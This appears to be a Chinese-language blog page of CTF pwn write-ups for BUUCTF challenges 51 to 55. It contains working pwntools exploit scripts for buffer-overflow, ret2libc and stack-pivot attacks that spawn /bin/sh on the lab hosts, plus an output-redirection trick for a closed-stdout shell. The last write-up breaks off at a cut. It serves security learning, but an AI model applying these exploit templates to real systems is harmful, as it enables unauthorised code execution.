@@ -1,0 +1,845 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jwj-Learning">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="51.mrctf2020_easyoverflowret2text (1)分析 main函数：  简单来说就是让check函数执行后返回值为0，我们就能拿到后门函数，注意这里有gets函数漏洞，也就是溢出点在V4这。 check函数：  意思也很明显，就是检查V5是否和fake_flag相等，相等就返回0，那么思路就来了，要么我们通过溢出点覆盖V5让其等于fake_flag，要么我们将两个都覆盖为">
+<meta property="og:type" content="article">
+<meta property="og:title" content="51~60">
+<meta property="og:url" content="http://example.com/2024/01/23/WP/BUUCTF/51-60/index.html">
+<meta property="og:site_name" content="Dreaming">
+<meta property="og:description" content="51.mrctf2020_easyoverflowret2text (1)分析 main函数：  简单来说就是让check函数执行后返回值为0，我们就能拿到后门函数，注意这里有gets函数漏洞，也就是溢出点在V4这。 check函数：  意思也很明显，就是检查V5是否和fake_flag相等，相等就返回0，那么思路就来了，要么我们通过溢出点覆盖V5让其等于fake_flag，要么我们将两个都覆盖为">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240123191429618.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220151809322.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220151934994.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220152458741.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220153418888.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220173622514.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220173941127.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220173824481.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226200046043.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226200234147.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226200324735.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226201206355.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226215631456.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226215931644.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226220012990.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226220041388.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227162243747.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227162439575.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227170458706.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227171602957.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227173608295.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227173757161.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227173832640.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227174707294.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227185020553.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227203357987.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227213021200.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228161841491.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228165812631.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228170052582.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228170305828.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228175326939.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228180750105.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240301193717057.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240301193706562.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240301200537348.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240301193952374.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240304221057434.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305193309038.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305204211555.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305204445081.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305214603993.png">
+<meta property="article:published_time" content="2024-01-23T10:34:46.000Z">
+<meta property="article:modified_time" content="2024-04-18T08:43:14.456Z">
+<meta property="article:author" content="Jwj-Learning">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240123191429618.png">
+  
+  
+  
+  <title>51~60 - Dreaming</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Dreaming</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="51~60"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-23 18:34" pubdate>
+          2024年1月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          85 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">51~60</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="51-mrctf2020-easyoverflow"><a href="#51-mrctf2020-easyoverflow" class="headerlink" title="51.mrctf2020_easyoverflow"></a>51.mrctf2020_easyoverflow</h1><p>ret2text</p>
+<h2 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240123191429618.png" srcset="/img/loading.gif" lazyload alt="image-20240123191429618"></p>
+<p>main函数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220151809322.png" srcset="/img/loading.gif" lazyload alt="image-20240220151809322"></p>
+<p>简单来说就是让check函数执行后返回值为0，我们就能拿到后门函数，注意这里有gets函数漏洞，也就是溢出点在V4这。</p>
+<p>check函数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220151934994.png" srcset="/img/loading.gif" lazyload alt="image-20240220151934994"></p>
+<p>意思也很明显，就是检查V5是否和fake_flag相等，相等就返回0，那么思路就来了，要么我们通过溢出点覆盖V5让其等于fake_flag，要么我们将两个都覆盖为同一个值，回到主函数查看V4位置。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220152458741.png" srcset="/img/loading.gif" lazyload alt="image-20240220152458741"></p>
+<p>我们发现V5距离V4有0x30个字节大小，偏移量确定。</p>
+<p>看一下fake_flag是啥</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220153418888.png" srcset="/img/loading.gif" lazyload alt="image-20240220153418888"></p>
+<p>那么接下来payload就好写了。</p>
+<h2 id="2-payload"><a href="#2-payload" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>) <br>io=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29338</span>)<br><br>backdoor_addr=<span class="hljs-number">0x087D</span><br>padding=<span class="hljs-number">0x30</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+<span class="hljs-string">b&quot;n0t_r3@11y_f1@g&quot;</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="52-xdctf2015-pwn200"><a href="#52-xdctf2015-pwn200" class="headerlink" title="52.*xdctf2015_pwn200"></a>52.*xdctf2015_pwn200</h1><h2 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220173622514.png" srcset="/img/loading.gif" lazyload alt="image-20240220173622514"></p>
+<p>main函数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220173941127.png" srcset="/img/loading.gif" lazyload alt="image-20240220173941127"></p>
+<p>vuln函数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220173824481.png" srcset="/img/loading.gif" lazyload alt="image-20240220173824481"></p>
+<p>read漏洞，溢出152字节，完全够用</p>
+<p>偏移地址cyclic动调一下，是0x70&#x3D;112字节</p>
+<p>考虑到开了NX保护，优先选择ret2libc，那么payload的构造套用模板就行</p>
+<h2 id="2-payload-1"><a href="#2-payload-1" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">27705</span>)<br><span class="hljs-comment">#io=process(&#x27;./xxx&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./52&#x27;</span>)<br><br>vuln_addr=elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]	<span class="hljs-comment">#在溢出点在这，所以第一次要返回到vuln函数中进行第二次攻击	</span><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>padding=<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>	<span class="hljs-comment">#偏移地址</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1 += p32(write_plt)+p32(vuln_addr)<br>payload1 += p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#根据函数的用法来构造，如果是puts函数则参考64位的方法</span><br><br>io.sendline(payload1)<br><br><span class="hljs-comment">#下面这个需要根据实际情况获取泄露函数真实地址（看debug返回的信息判断如何接收）</span><br><span class="hljs-comment">#write_addr=u32(io.recv(4))	</span><br>write_addr=u32(io.recvuntil(<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br>log.success(<span class="hljs-string">&#x27;leak_write_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(write_addr)))<br>            <br><span class="hljs-comment">#以下为通用操作</span><br><span class="hljs-string">&#x27;&#x27;&#x27;libc = LibcSearcher(&quot;write&quot;,write_addr)</span><br><span class="hljs-string">libcbase=write_addr-libc.dump(&#x27;write&#x27;)</span><br><span class="hljs-string">system_addr=libcbase+libc.dump(&quot;system&quot;)</span><br><span class="hljs-string">str_bin_sh=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)&#x27;&#x27;&#x27;</span><br><br>libc=ELF(<span class="hljs-string">&#x27;32libc-2.23.so&#x27;</span>)<br>libcbase=write_addr-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>            <br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*padding+p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(str_bin_sh)<br><br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>PS：根据网上师傅的WP，接收地址的问题可以通过看debug来解决</p>
+<h1 id="53-ciscn-2019-s-4"><a href="#53-ciscn-2019-s-4" class="headerlink" title="53.*ciscn_2019_s_4"></a>53.*ciscn_2019_s_4</h1><h2 id="1-分析-2"><a href="#1-分析-2" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226200046043.png" srcset="/img/loading.gif" lazyload alt="image-20240226200046043"></p>
+<p>main</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226200234147.png" srcset="/img/loading.gif" lazyload alt="image-20240226200234147"></p>
+<p>vul</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226200324735.png" srcset="/img/loading.gif" lazyload alt="image-20240226200324735"></p>
+<p>read漏洞，溢出8字节</p>
+<p>hack</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226201206355.png" srcset="/img/loading.gif" lazyload alt="image-20240226201206355"></p>
+<p>没有&#x2F;bin&#x2F;sh字符串，需要自己填充，然后利用ROP链执行</p>
+<p>但是8字节不够用，两次read溢出，加中间的printf泄露旧ebp地址，就是上次遇到的25题，当复习了，顺便搞个模板</p>
+<p>思路还是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28967</span>)<br><br>system_addr=xxx	<span class="hljs-comment">#没有后门函数就自己构造，可能会与ret2libc结合</span><br>leave_ret=xxx	<span class="hljs-comment">#用ROPgadget找</span><br>padding=xxx<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(padding-<span class="hljs-number">1</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>	<span class="hljs-comment">#这里栈溢出覆盖后用b做了个标记方便获取ebp的地址</span><br>io.send(payload)	<span class="hljs-comment">#注意使用send输入</span><br>io.recvuntil(<span class="hljs-string">b&quot;b&quot;</span>)<br>s=u32(io.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0x38</span>	<span class="hljs-comment">#旧ebp-offset=esp（s起始位置）</span><br><span class="hljs-comment">#跳转到s的起始地址，即重新调转到这个栈内执行</span><br><br><span class="hljs-comment">#重新布置栈，进行栈劫持</span><br>payload2=<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(system_addr)+p32(<span class="hljs-number">0xdeadbeef</span>)+p32(s+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>payload2=payload2.ljust(padding,<span class="hljs-string">b&#x27;\x00&#x27;</span>)	 <br>payload2+=p32(s)+p32(leave_ret)	<span class="hljs-comment">#先覆盖ebp，再覆盖返回地址</span><br><br>io.send(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="2-payload-2"><a href="#2-payload-2" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">25513</span>)<br><br>system_addr=<span class="hljs-number">0x8048400</span>	<span class="hljs-comment">#没有后门函数就自己构造，可能会与ret2libc结合</span><br>leave_ret=<span class="hljs-number">0x08048562</span>	<span class="hljs-comment">#用ROPgadget找</span><br>padding=<span class="hljs-number">0x28</span><br>offset=<span class="hljs-number">0x38</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(padding-<span class="hljs-number">1</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>	<span class="hljs-comment">#这里栈溢出覆盖后用b做了个标记方便获取ebp的地址</span><br>io.send(payload)	<span class="hljs-comment">#注意使用send输入</span><br>io.recvuntil(<span class="hljs-string">b&quot;b&quot;</span>)<br>s=u32(io.recv(<span class="hljs-number">4</span>))-offset	<span class="hljs-comment">#旧ebp-offset=esp（s起始位置）</span><br><span class="hljs-comment">#跳转到s的起始地址，即重新调转到这个栈内执行</span><br><br><span class="hljs-comment">#重新布置栈，进行栈劫持</span><br>payload2=<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(system_addr)+p32(<span class="hljs-number">0xdeadbeef</span>)+p32(s+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>payload2=payload2.ljust(padding,<span class="hljs-string">b&#x27;\x00&#x27;</span>)	 <br>payload2+=p32(s)+p32(leave_ret)	<span class="hljs-comment">#先覆盖ebp，再覆盖返回地址</span><br><br>io.send(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="54-wustctf2020-closed"><a href="#54-wustctf2020-closed" class="headerlink" title="54.wustctf2020_closed"></a>54.wustctf2020_closed</h1><h2 id="1-分析-3"><a href="#1-分析-3" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226215631456.png" srcset="/img/loading.gif" lazyload alt="image-20240226215631456"></p>
+<p>main</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226215931644.png" srcset="/img/loading.gif" lazyload alt="image-20240226215931644"></p>
+<p>vulnerable</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226220012990.png" srcset="/img/loading.gif" lazyload alt="image-20240226220012990"></p>
+<p>shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226220041388.png" srcset="/img/loading.gif" lazyload alt="image-20240226220041388"></p>
+<p>给了后门函数，但是没看到溢出点，我们查一下vulnerable中close(1)和close(2)的意思。</p>
+<p>文件描述符为0、1和2 （常说的输入、输出和报错），那么这里的意思就是关闭了标准输出和报错，只剩下标准输入开着。</p>
+<p>看了别人的wp发现这又是linux命令的小知识，我们可以对stdout重定向，将文件描述符 1 重定向到文件描述符 0 ：因此这题不用写exp，直接执行&#x3D;&#x3D;execv 1&gt;&amp;0&#x3D;&#x3D;</p>
+<p>这会执行 <code>execv</code> 程序，并将<code>execv</code> 程序的标准输出重定向到当前终端的标准输入，这样 <code>execv</code> 程序输出的内容会被发送到当前终端，并成为当前终端的输入。</p>
+<p>因为默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端，所以这条语句相当于重启了标准输出，此时就可以执行命令并且看得到输出了</p>
+<h1 id="55-ZJCTF-2019-Login"><a href="#55-ZJCTF-2019-Login" class="headerlink" title="55.[ZJCTF 2019]Login"></a>55.[ZJCTF 2019]Login</h1><h2 id="1-分析-4"><a href="#1-分析-4" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227162243747.png" srcset="/img/loading.gif" lazyload alt="image-20240227162243747"></p>
+<p>main</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227162439575.png" srcset="/img/loading.gif" lazyload alt="image-20240227162439575"></p>
+<p>终于遇见C++的题了，先去网上学习一下</p>
+<p>看不懂伪代码就先运行一下</p>
